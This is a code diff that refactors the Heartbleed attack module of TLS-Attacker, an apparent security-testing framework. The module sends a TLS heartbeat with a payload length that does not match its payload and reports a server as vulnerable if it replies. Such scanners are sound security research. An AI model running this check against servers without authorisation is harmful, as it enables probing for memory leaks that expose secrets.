@@ -3,7 +3,8 @@
  *
  * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
  *
- * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
+ * Licensed under Apache License 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0
  */
 package de.rub.nds.tlsattacker.attacks.impl;
 
@@ -15,7 +16,7 @@ import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFact
 import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
 import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
-import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
+import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
 import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
@@ -55,7 +56,7 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
 	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
 	ModifiableByteArray payload = new ModifiableByteArray();
 	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
-	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
+	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
 	hb.setHeartbeatMessageType(heartbeatMessageType);
 	hb.setPayload(payload);
 	hb.setPayloadLength(payloadLength);
@@ -68,21 +69,21 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
 		    ex);
 	}
 
-	if (trace.receivedFinished()) {
-	    ProtocolMessage lastMessage = trace.getLastReceiveMesssage();
-	    if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
-		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
-			"Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
-		vulnerable = true;
-	    } else {
-		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
-			"(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
-		vulnerable = false;
-	    }
-	} else {
-	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
-		    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
-	}
+	if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
+                    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+        } else {
+            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(trace.getAllActuallyReceivedMessages().size()-1);
+            if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
+                LOGGER.log(LogLevel.CONSOLE_OUTPUT,
+                        "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
+                vulnerable = true;
+            } else {
+                LOGGER.log(LogLevel.CONSOLE_OUTPUT,
+                        "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
+                vulnerable = false;
+            }
+        }
 
 	tlsContexts.add(tlsContext);
 
